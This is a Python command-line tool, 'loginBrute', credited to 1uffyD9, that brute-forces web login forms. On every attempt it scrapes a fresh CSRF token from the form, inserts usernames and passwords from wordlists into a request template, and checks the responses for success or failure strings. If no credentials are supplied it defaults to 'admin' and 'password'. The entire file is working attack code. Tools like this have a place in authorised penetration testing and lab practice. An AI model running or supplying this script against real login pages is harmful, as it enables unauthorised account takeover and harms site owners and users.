#!/usr/bin/env python3

from colored import fg, bg, attr, stylize
from bs4 import BeautifulSoup
from math import pow
import urllib.parse
import requests
import warnings
import colorama
import argparse
import hashlib
import sys
import os
import random
import time
import re

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

class LoginBrute:

    default = fg(246)
    green = fg(34) + attr('bold')
    yellow = fg(221)
    reset = attr('reset')

    error = fg('red') + '[!] ' + default      
    detail = fg(220) + '[*] ' + default         
    fail = fg('red') + '[-] ' + default         
    success = fg('green') + '[+] ' + default    
    event = fg(26) + '[*] ' + default           
    debug = fg('magenta') + '[%] ' + default    
    notification = fg(246) + '[-] ' + default   

    creds_found = 0

    __author__= default + '''
######################################################
 _             _       ____             _       
| | ___   __ _(_)_ __ | __ ) _ __ _   _| |_ ___ 
| |/ _ \ / _` | | '_ \|  _ \| '__| | | | __/ _ \\
| | (_) | (_| | | | | | |_) | |  | |_| | ||  __/
|_|\___/ \__, |_|_| |_|____/|_|   \__,_|\__\___|
         |___/                                  
######################################################
    [+] Author : 1uffyD9
    [+] Github : https://github.com/1uffyD9
######################################################
'''

    def __init__(self,):
        try:
            print (self.__author__, end='')     
            args = self.get_args()              
            self.bruteForcer(args)              
        except KeyboardInterrupt:
            sys.exit('\n' + self.error + "Keyboard inturruption occurd, exiting the program..")

    def get_args(self,):
        parser = argparse.ArgumentParser(description='loginBrute will bruteforce on logins where csrf token is validated for each requests.')
        parser.add_argument('-t', '--token', type=str, help='specify the csrf token/tokens validated by the web server.')
        parser.add_argument('-U', '--user', type=str, help='specify the user name for the login')
        parser.add_argument('-u', '--userList', type=str, help='specify the wordlist for the esername')
        parser.add_argument('-P', '--password', type=str, help='specify the password for the login')
        parser.add_argument('-p', '--passList', type=str, help='specify the wordlist for the password')
        parser.add_argument('-m', '--method', type=str, help='specify the method: (GET, POST)', required=True)
        parser.add_argument('-d', '--data', type=str, help='specify the parameters, Ex: username=$U&password=$P&submit=yes', required=True)
        parser.add_argument('-l', '--link', type=str, help='specify the link to the form', required=True)
        
        return parser.parse_args()

    def bruteForcer(self, args):
        token = args.token
        user = args.user
        userList = args.userList
        password = args.password
        passList = args.passList
        method = args.method
        data = args.data
        url = args.link

        if userList and passList and userList == passList:
            print (self.debug + "Reading wordlist...",end='')
            try:
                userList = passList = open(userList, 'rb').readlines()
            except IOError as e:
                sys.exit(self.error + str(e).split("] ")[1])

        elif userList and passList and userList != passList:
            print (self.debug + "Reading wordlist...",end='')
            try:
                userList = open(userList, 'rb').readlines()
            except IOError as e:
                sys.exit(self.error + 'User list: ' + str(e).split("] ")[1])
            try:
                passList = open(passList, 'rb').readlines()
            except IOError as e:
                sys.exit(self.error + 'Pass list: ' + str(e).split("] ")[1])

        elif userList and not passList and password:
            print (self.debug + "Reading wordlist...",end='')
            try:
                userList = open(userList, 'rb').readlines()
            except IOError as e:
                sys.exit(self.error + 'User list: ' + str(e).split("] ")[1])

        elif userList and not passList and not password:
            password = "password"
            print (self.debug + "Reading wordlist...",end='')
            try:
                userList = open(userList, 'rb').readlines()
            except IOError as e:
                sys.exit(self.error + 'User list: ' + str(e).split("] ")[1])

        elif not userList and passList and user:
            print (self.debug + "Reading wordlist...",end='')
            try:
                passList = open(passList, 'rb').readlines()
            except IOError as e:
                sys.exit(self.error + 'Pass list: ' + str(e).split("] ")[1])

        elif not userList and passList and not user:
            user = "admin"
            print (self.debug + "Reading wordlist...",end='')
            try:
                passList = open(passList, 'rb').readlines()
            except IOError as e:
                sys.exit(self.error + 'Pass list: ' + str(e).split("] ")[1])

        else:
            if not user and not userList:
                user = "admin"
                print ("\n{}Username or username list not given. Trying with the default username,'admin'..{}".format(self.event, self.reset),end='') 
            if not password and not passList:
                password = "password"
                print ("\n{}Password or password list not given. Trying with the default password.'password'..{}".format(self.event, self.reset))

        __taskInfo__ = self.default + '''
######################################################
    {}URL                        : {}
    {}Username or username list  : {}
    {}Password or password list  : {}
    {}Token                      : {}
    {}Method                     : {}
######################################################
        '''.format(
                self.detail, url,                                           
                self.detail, user if not userList else args.userList,       
                self.detail, password if not passList else args.passList,   
                self.detail, token,                                         
                self.detail, method.upper()                                 
                )
        print (__taskInfo__)
        print (self.debug + "Start attacking....")

        if not userList:
            self.passEnum(user, url, token, method, data, password, passList)
        else:
            for user in userList:
                self.passEnum(user, url, token, method, data, password, passList)
        if self.creds_found == 0:
            sys.exit(self.fail + "Valid credentials not found! Try again")
        else:
            sys.exit(self.fail + "Valid credentials not found after that! Try again with different wordlist")

    def passEnum (self, username, url, token, method, data, password=None, passList=None):
        if not passList:
            self.makeRequest(url, token, method, data, username, password)
        else:
            for passwd in passList:
                self.makeRequest(url, token, method, data, username, passwd)


    def makeRequest(self, url, token, method, data, username="admin", password="password"):
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}

        username = username.decode('utf-8').rstrip('\n') if isinstance(username, bytes) else username
        password = password.decode('utf-8').rstrip('\n') if isinstance(password, bytes) else password
        print('\r' + self.debug + "%s: %s" % (username, password) + " " * 15, end = '\r')
        
        csrf_token = None
        try:
            request = requests.session()
            page = request.get(url, headers=headers)
            html_content = page.text
            soup = BeautifulSoup(html_content, "lxml")
            if token:
                for element in soup.findAll('input'):
                    if element.attrs['name'] == token:
                        csrf_token = element.get("value")
        except requests.exceptions.RequestException as e:
            sys.exit(self.error + "Something going wrong with the request. Please check the url and the connectivity")

        lst = re.split(':', data)
        login_success_msg = lst[1] if lst[1] else None
        login_fail_msg = lst[2] if lst[2] else None

        lst = re.split('&|=', lst[0])
        login_info_lst = {lst[i]: lst[i+1] for i in range(0, len(lst), 2)}
        for key, value in login_info_lst.items():
            if value == '$U':
                login_info_lst[key] = username
            if value == '$P':
                login_info_lst[key] = password
        if token:
            login_info_lst[token] = csrf_token

        login_info = urllib.parse.urlencode(login_info_lst).encode('utf-8')

        if method == "post":
            login_response = request.post(url, login_info, headers=headers)
            response_content = BeautifulSoup(login_response.text, "lxml")

            if login_success_msg and not login_fail_msg:
                if login_success_msg in login_response.text:
                    sys.exit(self.success + "Credentails found: '{}{}{}':'{}{}{}'".format(self.green, username, self.default, self.green, password, self.default))
            elif login_fail_msg and not login_success_msg:
                if login_fail_msg not in login_response.text:
                    detect_element = False
                    for element in response_content.findAll("input"):
                        if not element.attrs['name'] in list(login_info_lst.keys()):
                            detect_element = True
                            break
                    if not detect_element:
                        print(self.success + "Credentails found: '{}{}{}':'{}{}{}'".format(self.green, username, self.default, self.green, password, self.default))
                        if (True if input("Do you want to continue bruteforcing (n for exit)? ").strip().lower() == 'n' else False):
                            sys.exit(self.error + "Exiting the program..")
                        else:
                            self.creds_found = 3
                    else:
                        print (self.debug + "Same login page detected for '{}{}{}':'{}{}{}'".format(self.yellow, username, self.default, self.yellow, password, self.default))
                        if (True if input("Do you want to continue bruteforcing (n for exit)? ").strip().lower() == 'n' else False):
                            sys.exit(self.error + "Exiting the program..")
                        else: 
                            self.creds_found = 3
            else:
                sys.exit(self.error + "Set either success msg or fail msg and try again")
            
        elif method == "get":
            login_response = request.get(url=url, headers=headers, params=login_info)
            response_content = BeautifulSoup(login_response.text, "lxml")
            
            if login_success_msg and not login_fail_msg:
                if login_success_msg in login_response.text:
                    sys.exit(self.success + "Credentails found: '{}{}{}':'{}{}{}'".format(self.green, username, self.default, self.green, password, self.default))
            elif login_fail_msg and not login_success_msg:
                if login_fail_msg not in login_response.text:
                    detect_element = False
                    for element in response_content.findAll("input"):
                        if not element.attrs['name'] in list(login_info_lst.keys()):
                            detect_element = True
                            break
                    if not detect_element:
                        print(self.success + "Credentails found: '{}{}{}':'{}{}{}'".format(self.green, username, self.default, self.green, password, self.default))
                        if (True if input("Do you want to continue bruteforcing (n for exit)? ").strip().lower() == 'n' else False):
                            sys.exit(self.error + "Exiting the program..")
                        else:
                            self.creds_found = 3
                    else:
                        print (self.debug + "Same login page detected for '{}{}{}':'{}{}{}'".format(self.yellow, username, self.default, self.yellow, password, self.default))
                        if (True if input("Do you want to continue bruteforcing (n for exit)? ").strip().lower() == 'n' else False):
                            sys.exit(self.error + "Exiting the program..")
                        else: 
                            self.creds_found = 3
            else:
                sys.exit(self.error + "Set either success msg or fail msg and try again")
            
        else:
            sys.exit(self.error + "Invalid method. Try again")

LoginBrute()

